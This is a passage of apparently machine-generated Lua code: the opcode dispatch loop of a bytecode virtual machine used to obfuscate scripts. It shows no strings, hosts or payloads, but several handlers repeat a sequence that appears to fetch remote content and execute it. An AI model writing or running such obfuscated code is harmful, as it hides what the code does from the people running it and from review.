                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                else
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                end
              elseif (Enum <= 83) then
                if (Enum <= 81) then
                  local A = Inst[2];
                  local T = Stk[A];
                  local B = Inst[3];
                  for Idx = 1, B do
                    T[Idx] = Stk[A + Idx];
                  end
                elseif (Enum > 82) then
                  local B;
                  local A;
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                else
                  local B;
                  local A;
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                end
              elseif (Enum <= 84) then
                local B;
                local A;
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
              elseif (Enum > 85) then
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              else
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              end
            elseif (Enum <= 92) then
              if (Enum <= 89) then
                if (Enum <= 87) then
                  local A;
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                elseif (Enum > 88) then
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3] ~= 0;
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                else
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                end
              elseif (Enum <= 90) then
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              elseif (Enum == 91) then
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              else
                local K;
                local B;
                local A;
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                B = Inst[3];
                K = Stk[B];
                for Idx = B + 1, Inst[4] do
                  K = K .. Stk[Idx];
                end
                Stk[Inst[2]] = K;
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
              end
            elseif (Enum <= 95) then
              if (Enum <= 93) then
                local B;
                local A;
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
              elseif (Enum > 94) then
                local Edx;
                local Results, Limit;
                local A;
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3] ~= 0;
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              else
                local A;
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]] / Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Env[Inst[3]] = Stk[Inst[2]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
              end
            elseif (Enum <= 97) then
              if (Enum > 96) then
                local A = Inst[2];
                local C = Inst[4];
                local CB = A + 2;
                local Result = {Stk[A](Stk[A + 1], Stk[CB])};
                for Idx = 1, C do
                  Stk[CB + Idx] = Result[Idx];
                end
                local R = Result[1];
                if R then
                  Stk[CB] = R;
                  VIP = Inst[3];
                else
                  VIP = VIP + 1;
                end
              else
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              end
            elseif (Enum == 98) then
              local Edx;
              local Results, Limit;
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]]();
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            else
              local Results;
              local Edx;
              local Results, Limit;
              local B;
              local A;
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A](Stk[A + 1]);
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Stk[A + 1]));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results = {Stk[A](Unpack(Stk, A + 1, Top))};
              Edx = 0;
              for Idx = A, Inst[4] do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              VIP = Inst[3];
            end
          elseif (Enum <= 149) then
            if (Enum <= 124) then
              if (Enum <= 111) then
                if (Enum <= 105) then
                  if (Enum <= 102) then
                    if (Enum <= 100) then
                      local A;
                      A = Inst[2];
                      Stk[A](Unpack(Stk, A + 1, Inst[3]));
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      do
                        return;
                      end
                    elseif (Enum == 101) then
                      local Edx;
                      local Results, Limit;
                      local B;
                      local A;
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      B = Stk[Inst[3]];
                      Stk[A + 1] = B;
                      Stk[A] = B[Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                      Top = (Limit + A) - 1;
                      Edx = 0;
                      for Idx = A, Top do
                        Edx = Edx + 1;
                        Stk[Idx] = Results[Edx];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]]();
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      do
                        return;
                      end
                    else
                      local Edx;
                      local Results, Limit;
                      local B;
                      local A;
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      B = Stk[Inst[3]];
                      Stk[A + 1] = B;
                      Stk[A] = B[Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3] ~= 0;
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                      Top = (Limit + A) - 1;
                      Edx = 0;
                      for Idx = A, Top do
                        Edx = Edx + 1;
                        Stk[Idx] = Results[Edx];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]]();
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      do
                        return;
                      end
                    end
                  elseif (Enum <= 103) then
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  elseif (Enum > 104) then
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  else
                    Stk[Inst[2]][Inst[3]] = Inst[4];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Inst[4];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                  end
                elseif (Enum <= 108) then
                  if (Enum <= 106) then
                    local Edx;
                    local Results, Limit;
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
